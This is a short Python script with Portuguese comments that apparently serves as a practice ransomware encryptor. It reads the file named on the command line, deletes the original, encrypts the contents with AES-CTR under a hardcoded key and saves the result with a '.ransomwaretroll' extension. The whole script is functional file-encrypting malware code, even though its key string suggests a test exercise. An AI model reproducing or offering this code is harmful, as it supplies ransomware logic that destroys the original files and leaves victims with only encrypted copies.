import sys
import os
import pyaes

## abrir o arquivo a ser criptografado
def main():
    if len(sys.argv) <= 1:
        print("you need to pass a file as an argument")
        return
    file_name = sys.argv[1] 
    file = open(file_name, "rb")
    file_data = file.read()
    file.close()

    os.remove(file_name)
    key = str.encode("testeransomwares")
    aes = pyaes.AESModeOfOperationCTR(key)

    ## criptografar o arquivo
    crypto_data = aes.encrypt(file_data)

    ## salvar o arquivo criptografado
    new_file = file_name + ".ransomwaretroll"
    new_file = open(f'{new_file}','wb')
    new_file.write(crypto_data)
    new_file.close()

if __name__ == '__main__':
    main()
